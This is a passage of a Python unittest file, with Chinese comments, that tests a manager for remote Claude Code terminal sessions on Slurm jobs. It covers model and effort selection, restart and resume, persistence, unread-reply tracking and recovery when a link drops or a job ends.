            m.choose(sid, 2)
        self.assertEqual(cm.exception.api_code, "nav_timeout")
        self.assertLess(time.monotonic() - t0, 3)
        self.assertEqual(self.rem.keys_sent(sid), ["Down"])   # 没有响应就停，不盲按

    def test_choose_rejects_model_panel(self):
        m = self.mgr()
        sid = self.start(m)
        m.open_model_picker(sid)
        with self.assertRaises(S.OpError) as cm:
            m.choose(sid, 0)
        self.assertEqual(cm.exception.api_code, "wrong_dialog")


class TestModel(Base):
    def test_open_picker_collects_full_list_and_restores_cursor(self):
        m = self.mgr()
        sid = self.start(m)
        r = m.open_model_picker(sid)
        self.assertEqual([x["name"] for x in r["rows"]], [n for n, _ in SimTUI.MODELS])
        self.assertEqual([x["n"] for x in r["rows"]], [1, 2, 3, 4, 5, 6])
        self.assertEqual([x["index"] for x in r["rows"]], list(range(6)))
        self.assertEqual([x["current"] for x in r["rows"]], [False, False, False, False, True, False])
        self.assertEqual(r["rows"][3]["desc"], "Sonnet 5.5 · Efficient for routine tasks · $2/$10 per Mtok")
        self.assertEqual(r["cursor"], 4)
        self.assertEqual(r["effort"], {"level": "low", "label": "Low effort", "is_default": False})
        t = self.tui(sid)
        self.assertEqual(t.view, "model")       # 面板保持打开
        self.assertEqual(t.sel, 4)              # 回到原光标
        self.assertFalse(t.wrapped)
        keys = self.rem.keys_sent(sid)
        self.assertEqual(keys, ["Up"] * 4 + ["Down"] * 5 + ["Up"])
        self.assertEqual(self.rem.ops("paste")[-1], {"sid": sid, "text": "/model", "enter": False})
        self.assertEqual(self.rem.submits(sid)[-1]["guard"]["popup"], "/model")
        ml = [e["data"] for e in m.session_events(sid) if e["data"].get("type") == "model_list"]
        self.assertEqual(ml[-1]["cursor"], 4)
        self.assertEqual(len(ml[-1]["rows"]), 6)
        self.assertEqual(m.get_meta(sid)["dialog_kind"], "model")

    def test_apply_model_session_scope_uses_s(self):
        m = self.mgr()
        sid = self.start(m)
        m.open_model_picker(sid)
        n0 = len(self.rem.keys_sent(sid))
        r = m.apply_model(sid, 1, effort="high", scope="session")
        keys = self.rem.keys_sent(sid)[n0:]
        self.assertEqual(keys, ["Up", "Up", "Up", "Right", "Right", "s"])
        self.assertNotIn("Enter", keys)
        t = self.tui(sid)
        self.assertEqual(t.current, 1)
        self.assertEqual(t.effort, "high")
        self.assertEqual(t.saved, [])
        self.assertEqual(r["result"], "Set model to Opus 5.5")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["model"] == "Opus 5.5"))

    def test_apply_model_save_uses_enter(self):
        m = self.mgr()
        sid = self.start(m)
        m.open_model_picker(sid)
        m.apply_model(sid, 5, scope="save")
        self.assertEqual(self.rem.keys_sent(sid)[-2:], ["Down", "Enter"])
        self.assertEqual(self.tui(sid).saved, ["Fable 5.2 (1M)"])

    def test_apply_model_unsupported_effort(self):
        m = self.mgr()
        sid = self.start(m)
        m.open_model_picker(sid)
        with self.assertRaises(S.OpError) as cm:
            m.apply_model(sid, 5, effort="xhigh")
        self.assertEqual(cm.exception.api_code, "effort_unsupported")
        self.assertEqual(self.tui(sid).view, "model")   # 面板保持打开，未确认
        self.assertNotIn("s", self.rem.keys_sent(sid))
        self.assertLessEqual(self.rem.keys_sent(sid).count("Right") + self.rem.keys_sent(sid).count("Left"), 8)

    def test_apply_model_requires_panel(self):
        m = self.mgr()
        sid = self.start(m)
        with self.assertRaises(S.OpError) as cm:
            m.apply_model(sid, 0)
        self.assertEqual(cm.exception.api_code, "no_model_panel")
        for bad in (dict(index=-1), dict(index=0, effort="ultra"), dict(index=0, scope="global"),
                    dict(index=True)):
            with self.assertRaises(ValueError):
                m.apply_model(sid, **bad)

    def test_picker_refused_when_busy_or_dialog(self):
        m = self.mgr()
        sid = self.start(m)
        m.send_message(sid, "/busy")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "busy"))
        with self.assertRaises(S.OpError) as cm:
            m.open_model_picker(sid)
        self.assertEqual(cm.exception.api_code, "busy")
        m.interrupt(sid)
        m.send_message(sid, "/tool")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["dialog_kind"] == "permission"))
        with self.assertRaises(S.OpError) as cm:
            m.open_model_picker(sid)
        self.assertEqual(cm.exception.api_code, "dialog_open")

    def test_picker_with_leftover_input(self):
        m = self.mgr()
        sid = self.start(m)
        self.tui(sid).input = "旧的问题"
        with self.assertRaises(S.OpError) as cm:
            m.open_model_picker(sid)
        self.assertEqual(cm.exception.api_code, "input_not_empty")
        self.assertEqual(self.rem.ops("paste"), [])
        r = m.open_model_picker(sid, clear_input=True)
        self.assertEqual(len(r["rows"]), 6)

    def test_reopen_when_already_open(self):
        m = self.mgr()
        sid = self.start(m)
        m.open_model_picker(sid)
        r = m.open_model_picker(sid)   # 面板已开：不再输入 /model
        self.assertEqual(len(self.rem.ops("paste")), 1)
        self.assertEqual(r["cursor"], 4)


class TestEffort(Base):
    def test_apply_effort(self):
        m = self.mgr()
        sid = self.start(m)
        r = m.apply_effort(sid, "xhigh", "session")
        self.assertEqual(self.rem.ops("paste")[-1]["text"], "/effort")
        self.assertEqual(self.rem.keys_sent(sid), ["Right", "Right", "Right", "s"])
        self.assertEqual(self.tui(sid).effort, "xhigh")
        self.assertEqual(r["result"], "Set effort level to xhigh")
        self.assertEqual(m.get_meta(sid)["effort"], "xhigh")
        m.apply_effort(sid, "medium", "save")
        self.assertEqual(self.rem.keys_sent(sid)[-3:], ["Left", "Left", "Enter"])
        self.assertEqual(self.tui(sid).saved, ["effort:medium"])

    def test_effort_validation(self):
        m = self.mgr()
        sid = self.start(m)
        with self.assertRaises(ValueError):
            m.apply_effort(sid, "ultra", "session")
        with self.assertRaises(ValueError):
            m.apply_effort(sid, "low", "forever")


class TestCloseRestart(Base):
    def test_close_sends_exit_then_kills_and_stops_keeper(self):
        m = self.mgr()
        sid = self.start(m)
        m.close(sid)
        self.assertEqual(self.rem.ops("paste")[-1], {"sid": sid, "text": "/exit", "enter": False})
        self.assertEqual(self.rem.submits(sid)[-1]["guard"]["popup"], "/exit")
        self.assertEqual(self.rem.ops("kill")[-1], {"sid": sid})
        self.assertEqual(len(self.rem.ops("stop_keeper")), 1)
        self.assertFalse(self.rem.keeper)
        meta = m.get_meta(sid)
        self.assertEqual(meta["state"], "exited")
        self.assertEqual(meta["claude_session_id"], UUID1)
        self.assertTrue(any(e["data"].get("type") == "exit" for e in m.session_events(sid)))
        with self.assertRaises(S.OpError):
            m.send_message(sid, "hi")

    def test_close_while_busy_and_dialog_escapes_first(self):
        m = self.mgr()
        sid = self.start(m)
        m.send_message(sid, "/tool")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["dialog_kind"] == "permission"))
        m.close(sid)
        self.assertEqual(self.rem.keys_sent(sid), ["Escape"])
        self.assertEqual(self.rem.ops("paste")[-1]["text"], "/exit")

    def test_close_keeps_keeper_when_other_session(self):
        m = self.mgr()
        a = self.start(m)
        self.start(m)
        m.close(a)
        self.assertTrue(self.rem.keeper)
        self.assertEqual(len(self.rem.tuis), 1)

    def test_close_unresponsive_kills(self):
        m = self.mgr()
        m.exit_timeout = 0.5
        sid = self.start(m)
        t = self.tui(sid)
        t.paste = lambda text, enter: None     # /exit 不起作用
        m.close(sid)
        self.assertEqual(self.rem.ops("kill")[-1], {"sid": sid})
        self.assertEqual(m.get_meta(sid)["state"], "exited")
        self.assertTrue(any("已结束 tmux 会话" in (e["data"].get("text") or "") for e in m.session_events(sid)))

    def test_restart_resumes_with_launch_params(self):
        m = self.mgr()
        sid = self.start(m, model="sonnet", permission_mode="plan")
        self.converse(m, sid)
        meta = m.restart(sid, jobid="67890")
        self.assertEqual(meta["jobid"], "67890")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "idle"))
        starts = self.rem.ops("start")
        self.assertEqual(len(starts), 2)
        self.assertEqual(starts[1]["args"], ["--resume", UUID1, "--model", "sonnet", "--permission-mode", "plan"])
        self.assertEqual(self.rem.ops("paste")[0]["text"], "/exit")   # 旧会话先 /exit
        self.assertEqual(m.get_meta(sid)["link"], "ready")

    def test_restart_after_exit(self):
        m = self.mgr()
        sid = self.start(m)
        self.converse(m, sid)
        m.close(sid)
        m.restart(sid)
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "idle"))
        self.assertEqual(self.rem.ops("start")[1]["args"], ["--resume", UUID1])

    def test_claude_exits_by_itself(self):
        m = self.mgr()
        sid = self.start(m)
        m.send_keys(sid, ["Escape"])
        self.tui(sid).dead = True
        self.tui(sid).exit_status = 0
        m.send_keys(sid, ["Escape"])      # 触发 stub 推送 exited 事件
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "exited"))
        self.assertTrue(wait_until(lambda: not self.rem.tuis))   # 空壳被清理
        self.assertTrue(wait_until(lambda: not self.rem.keeper))

    def test_remove(self):
        m = self.mgr()
        sid = self.start(m)
        m.remove(sid)
        with self.assertRaises(KeyError):
            m.get_meta(sid)
        self.assertEqual(self.rem.tuis, {})
        self.assertEqual(m.events_since(0), [])

    def test_remove_when_link_down_needs_force(self):
        m = self.mgr()
        sid = self.start(m)
        self.rem.links[0].set_state("down", "ssh 断开")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["link"] == "down"))
        # 作业还在（squeue 能查到）但连不上：409 link_down，需用户确认强制删除
        with self.assertRaises(S.OpError) as cm:
            m.remove(sid)
        self.assertEqual((cm.exception.api_code, cm.exception.http_status), ("link_down", 409))
        with self.assertRaises(S.LinkNotReady):
            m.send_message(sid, "hi")
        m.remove(sid, force=True)
        self.assertEqual(m.list_sessions(), [])

    def test_rename(self):
        m = self.mgr()
        sid = self.start(m)
        m.rename(sid, "  新名字\n ")
        meta = m.get_meta(sid)
        self.assertEqual((meta["title"], meta["display_title"], meta["title_user"]), ("新名字", "新名字", True))
        m.rename(sid, "   ")   # 清空 = 改回显示 Claude Code 里的标题（还没有时显示原来的名字）
        meta = m.get_meta(sid)
        self.assertEqual((meta["title_user"], meta["display_title"]), (False, "新名字"))


class TestPersistReattach(Base):
    def test_shutdown_does_not_close_remote_and_restart_reattaches(self):
        m1 = self.mgr()
        sid = self.start(m1, title="长任务", effort="high")
        m1.send_message(sid, "hello")
        m1.shutdown()
        self.assertEqual(self.rem.ops("kill"), [])
        self.assertEqual([p["text"] for p in self.rem.ops("paste")], ["hello"])
        self.assertTrue(self.rem.links[0].closed)
        self.assertIn(sid, self.rem.tuis)
        data = json.loads((pathlib.Path(self.tmp) / "sessions.json").read_text())
        self.assertEqual(data["version"], 2)
        self.assertTrue(data["sessions"][0]["attached"])
        # app 重启
        n_log = len(self.rem.log)
        m2 = self.mgr()
        meta = m2.get_meta(sid)
        self.assertEqual(meta["title"], "长任务")
        self.assertEqual(meta["launch"]["effort"], "high")
        self.assertTrue(wait_until(lambda: any(op == "watch" for op, _ in self.rem.log[n_log:])))
        self.assertTrue(wait_until(lambda: m2.get_meta(sid)["state"] == "idle"))
        new_ops = [op for op, _ in self.rem.log[n_log:]]
        self.assertIn("list", new_ops)
        self.assertNotIn("start", new_ops)
        self.assertNotIn("keys", new_ops)
        self.assertNotIn("paste", new_ops)
        tr = [e for e in m2.session_events(sid) if e["kind"] == "transcript"]
        self.assertTrue(tr and tr[0]["data"]["reset"])
        m2.send_message(sid, "again")
        self.assertEqual(self.rem.ops("paste")[-1]["text"], "again")

    def test_restart_marks_vanished_sessions_exited(self):
        m1 = self.mgr()
        sid = self.start(m1)
        m1.shutdown()
        self.rem.tuis.clear()   # 节点重启/作业结束
        m2 = self.mgr()
        self.assertTrue(wait_until(lambda: m2.get_meta(sid)["state"] == "exited"))
        self.assertEqual(m2.get_meta(sid)["claude_session_id"], UUID1)
        m2.restart(sid)
        self.assertTrue(wait_until(lambda: m2.get_meta(sid)["state"] == "idle"))
        self.assertEqual(self.rem.ops("start")[-1]["args"], ["--resume", UUID1])

    def test_exited_sessions_do_not_connect(self):
        m1 = self.mgr()
        sid = self.start(m1)
        m1.close(sid)
        m1.shutdown()
        n = len(self.rem.links)
        m2 = self.mgr()
        time.sleep(0.1)
        self.assertEqual(len(self.rem.links), n)
        self.assertEqual(m2.get_meta(sid)["state"], "exited")

    def test_link_reconnect_rewatches(self):
        m = self.mgr()
        sid = self.start(m)
        link = self.rem.links[0]
        link.set_state("down", "断开")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["link"] == "down"))
        n = len(self.rem.ops("watch"))
        link.set_state("ready")
        self.assertTrue(wait_until(lambda: len(self.rem.ops("watch")) > n))
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["link"] == "ready"))

    def test_v1_sessions_json_loaded_as_exited_without_params(self):
        v1 = {"version": 1, "sessions": [{"meta": {
            "sid": "s0123456789ab", "title": "旧会话", "jobid": "276403", "cwd": "/mnt/x",
            "model": "claude-opus", "permission_mode": "bypassPermissions", "claude_session_id": UUID2,
            "state": "ready", "created_at": 1.0}, "requested_model": "claude-opus"}]}
        (pathlib.Path(self.tmp) / "sessions.json").write_text(json.dumps(v1))
        m = self.mgr()
        meta = m.get_meta("s0123456789ab")
        self.assertEqual(meta["state"], "exited")
        self.assertEqual(meta["launch"], S._empty_launch())
        self.assertEqual(meta["claude_session_id"], UUID2)
        self.assertEqual(self.rem.links, [])

    def test_corrupt_sessions_json(self):
        (pathlib.Path(self.tmp) / "sessions.json").write_text("{nope")
        m = self.mgr()
        self.assertEqual(m.list_sessions(), [])
        self.assertTrue(any(p.name.startswith("sessions.json.corrupt-") for p in pathlib.Path(self.tmp).iterdir()))

    def test_persist_file_private(self):
        m = self.mgr()
        self.start(m)
        m.flush()
        st = os.stat(pathlib.Path(self.tmp) / "sessions.json")
        self.assertEqual(st.st_mode & 0o777, 0o600)


class TestUnread(Base):
    """完成但未看（侧栏"新回复"）：done_at / seen_at 的判定、清除、持久化与重新附着。"""

    def fast(self, m):
        m.notifier.QUIET_AFTER_RESET = 0.0
        m.notifier.CONFIRM_DELAY = 0.05
        m.resume_done_delay = 0.2
        return m

    def finish_turn(self, m, sid):
        t = self.tui(sid)
        t.busy = True
        m._fresh(m._get(sid))
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "busy"))
        t.busy = False
        m._fresh(m._get(sid))

    def test_done_marks_unread_and_seen_only_moves_forward(self):
        m = self.fast(self.mgr())
        sid = self.start(m)
        meta = m.get_meta(sid)
        self.assertEqual((meta["done_at"], meta["seen_at"], meta["unread"]), (None, None, False))
        with self.assertRaises(ValueError):
            m.mark_unseen(sid)                      # 没完成过不能标为未读
        self.finish_turn(m, sid)
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["unread"], 3))
        d1 = m.get_meta(sid)["done_at"]
        self.assertAlmostEqual(d1, time.time(), delta=5)
        # 客户端回传它看到的 done_at：不能超过服务器当前值；只能往前推
        r = m.mark_seen(sid, d1 + 1000)
        self.assertEqual((r["seen_at"], r["unread"]), (d1, False))
        m.mark_seen(sid, d1 - 50)
        self.assertEqual(m.get_meta(sid)["seen_at"], d1)
        for bad in (None, "1", True, float("nan"), float("inf"), -1, 0):
            with self.assertRaises(ValueError, msg=repr(bad)):
                m.mark_seen(sid, bad)
        # 标为未读 / 再标为已读
        m.mark_unseen(sid)
        self.assertTrue(m.get_meta(sid)["unread"])
        m.mark_seen(sid, d1)
        self.assertFalse(m.get_meta(sid)["unread"])
        # 新的一次完成：客户端用旧的 done_at 标已读，不会把新的一次盖掉
        self.finish_turn(m, sid)
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["done_at"] > d1, 3))
        m.mark_seen(sid, d1)
        self.assertTrue(m.get_meta(sid)["unread"])
        with self.assertRaises(KeyError):
            m.mark_seen("s000000000000", d1)

    def test_attention_does_not_mark_and_actions_clear(self):
        m = self.fast(self.mgr())
        sid = self.start(m)
        t = self.tui(sid)
        t.view = "perm"
        m._fresh(m._get(sid))
        time.sleep(0.2)
        self.assertEqual(m.get_meta(sid)["state"], "waiting")
        self.assertIsNone(m.get_meta(sid)["done_at"])      # 对话框不算新回复
        t.view = "idle"
        m._fresh(m._get(sid))
        self.finish_turn(m, sid)
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["unread"], 3))
        m.send_message(sid, "继续")                        # 发消息 = 看过了
        meta = m.get_meta(sid)
        self.assertFalse(meta["unread"])
        self.assertEqual(meta["seen_at"], meta["done_at"])
        # 回答对话框也清除
        m.mark_unseen(sid)
        t.view = "perm"
        m._fresh(m._get(sid))
        d = m.get_screen(sid)["state"]["dialog"]
        m.choose(sid, 0, expect=S.dialog_fingerprint(d))
        self.assertFalse(m.get_meta(sid)["unread"])

    def test_interrupted_turn_not_marked(self):
        m = self.fast(self.mgr())
        sid = self.start(m)
        t = self.tui(sid)
        t.busy = True
        m._fresh(m._get(sid))
        m.interrupt(sid)
        m._fresh(m._get(sid))
        time.sleep(0.3)
        self.assertEqual(m.get_meta(sid)["state"], "idle")
        self.assertIsNone(m.get_meta(sid)["done_at"])

    def test_persist_restore_and_validation(self):
        m1 = self.fast(self.mgr())
        sid = self.start(m1)
        self.finish_turn(m1, sid)
        self.assertTrue(wait_until(lambda: m1.get_meta(sid)["unread"], 3))
        d1 = m1.get_meta(sid)["done_at"]
        sj = pathlib.Path(self.tmp) / "sessions.json"
        self.assertTrue(wait_until(lambda: sj.exists() and json.loads(sj.read_text())
                                   ["sessions"][0]["meta"].get("done_at") == d1, 3))   # 状态变化即落盘
        m1.shutdown()
        m2 = self.mgr()
        meta = m2.get_meta(sid)
        self.assertEqual((meta["done_at"], meta["seen_at"], meta["unread"]), (d1, None, True))
        m2.mark_seen(sid, d1)
        m2.shutdown()
        m3 = self.mgr()
        self.assertEqual((m3.get_meta(sid)["seen_at"], m3.get_meta(sid)["unread"]), (d1, False))
        m3.shutdown()
        # 非法值：丢弃（seen_at 没有 done_at 时也丢弃）
        p = pathlib.Path(self.tmp) / "sessions.json"
        data = json.loads(p.read_text())
        for bad_done, bad_seen, want in ((True, d1, (None, None)), ("x", None, (None, None)), (float("inf"), None, (None, None)),
                                         (-5, None, (None, None)), (1e12, None, (None, None)), (d1, [1], (d1, None)),
                                         (d1, 3, (d1, None)), (None, d1, (None, None))):
            data["sessions"][0]["meta"]["done_at"] = bad_done
            data["sessions"][0]["meta"]["seen_at"] = bad_seen
            p.write_text(json.dumps(data))
            m = self.mgr()
            meta = m.get_meta(sid)
            self.assertEqual((meta["done_at"], meta["seen_at"]), want, (bad_done, bad_seen))
            m.shutdown()

    def test_completed_while_app_stopped(self):
        """停止时还在回复、重新附着后已经空闲 = 这期间完成了：补记"新回复"（不响）。"""
        m1 = self.fast(self.mgr())
        sid = self.start(m1)
        t = self.tui(sid)
        t.busy = True
        m1._fresh(m1._get(sid))
        self.assertTrue(wait_until(lambda: m1.get_meta(sid)["state"] == "busy"))
        m1.shutdown()
        t.busy = False                                    # app 停止期间回复完成
        m2 = self.fast(self.mgr())
        self.assertTrue(wait_until(lambda: m2.get_meta(sid)["unread"], 5), m2.get_meta(sid))
        m2.shutdown()
        self.assertFalse(json.loads((pathlib.Path(self.tmp) / "sessions.json").read_text())
                         ["sessions"][0].get("done_pending"))

    def test_still_busy_after_reattach_marks_when_done(self):
        m1 = self.fast(self.mgr())
        sid = self.start(m1)
        t = self.tui(sid)
        t.busy = True
        m1._fresh(m1._get(sid))
        self.assertTrue(wait_until(lambda: m1.get_meta(sid)["state"] == "busy"))
        m1.shutdown()
        m2 = self.fast(self.mgr())
        self.assertTrue(wait_until(lambda: m2.get_meta(sid)["state"] == "busy", 5))
        time.sleep(0.4)
        self.assertIsNone(m2.get_meta(sid)["done_at"])    # 还在回复：不标
        t.busy = False
        m2._fresh(m2._get(sid))
        self.assertTrue(wait_until(lambda: m2.get_meta(sid)["unread"], 5))

    def test_idle_at_shutdown_not_marked_after_restart(self):
        m1 = self.fast(self.mgr())
        sid = self.start(m1)
        m1.shutdown()
        m2 = self.fast(self.mgr())
        self.assertTrue(wait_until(lambda: m2.get_meta(sid)["state"] == "idle", 5))
        time.sleep(0.5)
        self.assertIsNone(m2.get_meta(sid)["done_at"])

    def test_user_interrupt_while_pending_cancels(self):
        m1 = self.fast(self.mgr())
        sid = self.start(m1)
        t = self.tui(sid)
        t.busy = True
        m1._fresh(m1._get(sid))
        self.assertTrue(wait_until(lambda: m1.get_meta(sid)["state"] == "busy"))
        m1.shutdown()
        m2 = self.fast(self.mgr())
        self.assertTrue(wait_until(lambda: m2.get_meta(sid)["state"] == "busy", 5))
        m2.interrupt(sid)                                 # 用户中断：不算完成
        m2._fresh(m2._get(sid))
        self.assertTrue(wait_until(lambda: m2.get_meta(sid)["state"] == "idle", 5))
        time.sleep(0.5)
        self.assertIsNone(m2.get_meta(sid)["done_at"])


class TestEvents(Base):
    def test_screen_throttle_and_latest_only(self):
        m = self.mgr()
        m.screen_interval = 0.25
        sid = self.start(m)
        s = m._get(sid)
        base = SimTUI().render()
        sub = m.subscribe()
        t0 = time.monotonic()
        for i in range(40):
            m._on_link_event("12345", {"ev": "screen", "sid": sid, "text": base + "\n frame %d" % i})
            time.sleep(0.01)
        time.sleep(0.4)
        got = []
        while True:
            e = sub.get(timeout=0.05)
            if e is None:
                break
            if e["kind"] == "screen":
                got.append(e)
        elapsed = time.monotonic() - t0
        self.assertLessEqual(len(got), int(elapsed / 0.25) + 2)
        self.assertTrue(got[-1]["data"]["text"].endswith("frame 39"))
        self.assertEqual(got[-1]["data"]["type"], "screen")
        self.assertIn("busy", got[-1]["data"]["state"])
        screens = [e for e in m.session_events(sid) if e["kind"] == "screen"]
        self.assertEqual(len(screens), 1)
        self.assertTrue(screens[0]["data"]["text"].endswith("frame 39"))
        replay = [e for e in m.events_since(0) if e["kind"] == "screen"]
        self.assertEqual(len(replay), 1)
        gs = [e["gseq"] for e in m.events_since(0)]
        self.assertEqual(gs, sorted(gs))
        self.assertEqual(m.get_screen(sid)["text"], s.screen_text)
        sub.close()

    def test_transcript_reset_replaces_buffer(self):
        m = self.mgr()
        sid = self.start(m)
        for i in range(3):
            m._on_link_event("12345", {"ev": "transcript", "sid": sid, "session_id": UUID1,
                                       "entries": [{"uuid": "x%d" % i}], "reset": False})
        m._on_link_event("12345", {"ev": "transcript", "sid": sid, "session_id": UUID2,
                                   "entries": [{"uuid": "y"}], "reset": True})
        tr = [e for e in m.session_events(sid) if e["kind"] == "transcript"]
        self.assertEqual(len(tr), 1)
        self.assertEqual(tr[0]["data"]["entries"], [{"uuid": "y"}])
        self.assertEqual(m.get_meta(sid)["claude_session_id"], UUID2)   # /clear 后切换

    def test_events_from_other_job_ignored(self):
        m = self.mgr()
        sid = self.start(m)
        n = m.gseq
        m._on_link_event("99999", {"ev": "transcript", "sid": sid, "entries": [{}], "reset": True})
        m._on_link_event("12345", {"ev": "screen", "sid": "s999999999999", "text": "x"})
        m._on_link_event("12345", "garbage")
        self.assertEqual(m.gseq, n)

    def test_session_status_waiting(self):
        m = self.mgr()
        sid = self.start(m)
        m._on_link_event("12345", {"ev": "session", "sid": sid, "data": {"status": "busy", "pid": 7}})
        meta = m.get_meta(sid)
        self.assertEqual(meta["status"], "busy")
        self.assertEqual(meta["claude_pid"], 7)

    def test_replay_gap(self):
        m = self.mgr()
        sid = self.start(m)
        evs, gap = m.replay_since(0)
        self.assertFalse(gap)
        self.assertTrue(all(e["sid"] == sid for e in evs))


# ============================================================================ 审查修复（review_v2_r1）
def notices(m, sid):
    return [e["data"].get("text") or "" for e in m.session_events(sid) if e["data"].get("type") == "notice"]


class TestJobEnded(Base):
    """高 1：作业结束（到时限被回收 / app 关着时结束）后会话不能卡死：能关、能删、能在新作业上 --resume。"""

    def test_link_reports_ended(self):
        m = self.mgr()
        sid = self.start(m)
        self.converse(m, sid)
        link = self.rem.links[0]
        self.rem.tuis.clear()                         # 作业结束：远端 tmux 随之消失
        link.end_job()
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "exited"))
        meta = m.get_meta(sid)
        self.assertEqual((meta["link"], meta["claude_session_id"]), ("ended", UUID1))
        self.assertTrue(any("已结束" in t for t in notices(m, sid)), notices(m, sid))
        self.assertTrue(wait_until(lambda: link.closed))    # 不再无限重连：link 关闭并移除
        self.assertNotIn("12345", m._links)
        n = len(self.rem.log)
        with self.assertRaises(S.OpError) as cm:
            m.restart(sid)                            # 旧作业已结束：必须换作业
        self.assertEqual((cm.exception.api_code, cm.exception.http_status), ("job_ended", 409))
        meta = m.restart(sid, jobid="123456")
        self.assertEqual(meta["jobid"], "123456")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "idle"))
        self.assertEqual(self.rem.ops("start")[-1]["args"], ["--resume", UUID1])
        self.assertNotIn("kill", [op for op, _ in self.rem.log[n:]])
        self.assertEqual(m.get_meta(sid)["link"], "ready")
        self.assertEqual(self.rem.links[-1].jobid, "123456")

    def test_squeue_gone_on_user_action(self):
        """link 一直连不上（app 关着时作业结束）：close/remove 时同步查 squeue → 已结束 → 本地标记，不再 503。"""
        m = self.mgr()
        a = self.start(m)
        b = self.start(m)
        self.rem.tuis.clear()
        self.rem.links[0].set_state("down", "srun: error: Slurm job 12345 has expired")
        self.assertTrue(wait_until(lambda: m.get_meta(a)["link"] == "down"))
        self.rem.job_state = True                     # squeue：Invalid job id specified
        n = len(self.rem.log)
        m.close(a)
        self.assertEqual(m.get_meta(a)["state"], "exited")
        self.assertTrue(wait_until(lambda: m.get_meta(b)["state"] == "exited"))   # 同作业的其它会话一并标记
        self.assertEqual(self.rem.log[n:], [])        # 没有向已结束的作业发任何请求
        # 从历史续接同一 Claude 会话不再被"已在本地会话中运行"拦下
        c = m.create(jobid="123456", cwd="~", resume=UUID1)["sid"]
        self.assertTrue(wait_until(lambda: m.get_meta(c)["state"] == "idle"))
        m.remove(b)                                   # 不带 force 也能删
        m.remove(a)
        self.assertEqual([x["sid"] for x in m.list_sessions()], [c])

    def test_link_down_job_alive_needs_force(self):
        m = self.mgr()
        sid = self.start(m)
        self.rem.links[0].set_state("down", "ssh: Connection timed out")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["link"] == "down"))
        self.rem.job_state = False                    # squeue：RUNNING
        for fn in (lambda: m.close(sid), lambda: m.restart(sid, jobid="123456"), lambda: m.remove(sid)):
            with self.assertRaises(S.OpError) as cm:
                fn()
            self.assertEqual((cm.exception.api_code, cm.exception.http_status), ("link_down", 409))
        self.assertNotEqual(m.get_meta(sid)["state"], "exited")
        self.assertEqual(m.get_meta(sid)["jobid"], "12345")
        # 用户确认强制：只在本地标记（远端可能残留），然后在新作业上续接
        self.rem.tuis.clear()
        m.restart(sid, jobid="123456", force=True)
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "idle"))
        self.assertTrue(any("强制" in t for t in notices(m, sid)))
        self.assertTrue(wait_until(lambda: self.rem.links[0].closed))   # 旧作业已无会话：关掉它的 link
        self.assertNotIn("12345", m._links)

    def test_close_force(self):
        m = self.mgr()
        sid = self.start(m)
        self.rem.links[0].set_state("down", "x")
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["link"] == "down"))
        self.rem.job_state = None                     # squeue 也查不了
        with self.assertRaises(S.OpError):
            m.close(sid)
        m.close(sid, force=True)
        self.assertEqual(m.get_meta(sid)["state"], "exited")


class TestLinkLifecycle(Base):
    """低 8：作业没有会话后关 link（ccr-agent step 随之结束）；同作业重启不关 link/keeper。"""

    def test_link_closed_when_no_sessions(self):
        m = self.mgr()
        a = self.start(m)
        b = self.start(m)
        link = self.rem.links[0]
        m.close(a)
        self.assertFalse(link.closed)
        m.remove(b)
        self.assertTrue(wait_until(lambda: link.closed))
        self.assertEqual(m._links, {})
        self.assertFalse(self.rem.keeper)
        self.assertEqual(m.get_meta(a)["link"], "down")
        m.restart(a)                                  # 再在该作业上操作：新建 link
        self.assertTrue(wait_until(lambda: m.get_meta(a)["state"] == "idle"))
        self.assertEqual(len(self.rem.links), 2)

    def test_restart_same_job_keeps_link_and_keeper(self):
        m = self.mgr()
        sid = self.start(m)
        m.restart(sid)
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "idle"))
        self.assertEqual(len(self.rem.links), 1)
        self.assertFalse(self.rem.links[0].closed)
        self.assertEqual(self.rem.ops("stop_keeper"), [])

    def test_reattach_all_gone_closes_link(self):
        m1 = self.mgr()
        sid = self.start(m1)
        m1.shutdown()
        self.rem.tuis.clear()
        m2 = self.mgr()
        self.assertTrue(wait_until(lambda: m2.get_meta(sid)["state"] == "exited"))
        self.assertTrue(wait_until(lambda: self.rem.links[-1].closed))
        self.assertEqual(m2._links, {})


class TestExitedEvents(Base):
    """中 2：迟到/误报的 exited 事件不能 kill 新启动或仍存活的会话。"""

    def test_stale_exited_after_restart_ignored(self):
        m = self.mgr()
        sid = self.start(m)
        old_pp = self.tui(sid).pane_pid
        m.restart(sid)
        self.assertTrue(wait_until(lambda: m.get_meta(sid)["state"] == "idle"))
        self.assertNotEqual(self.tui(sid).pane_pid, old_pp)
        n_kill, n_list = len(self.rem.ops("kill")), len(self.rem.ops("list"))
        m._on_link_event("12345", {"ev": "exited", "sid": sid, "exit_status": 0, "pane_pid": old_pp})
        time.sleep(0.2)
        self.assertEqual(m.get_meta(sid)["state"], "idle")
        self.assertEqual((len(self.rem.ops("kill")), len(self.rem.ops("list"))), (n_kill, n_list))
        self.assertTrue(self.rem.keeper)

    def test_false_exited_verified_and_rewatched(self):
        m = self.mgr()
        sid = self.start(m)
        n_watch, n_kill = len(self.rem.ops("watch")), len(self.rem.ops("kill"))
        # 没有代际信息（例如 agent 侧 tmux 连续暂时失败）：本地先 list 核实，pane 还活着 → 恢复监视
        m._on_link_event("12345", {"ev": "exited", "sid": sid, "exit_status": None})
        self.assertTrue(wait_until(lambda: len(self.rem.ops("watch")) > n_watch))
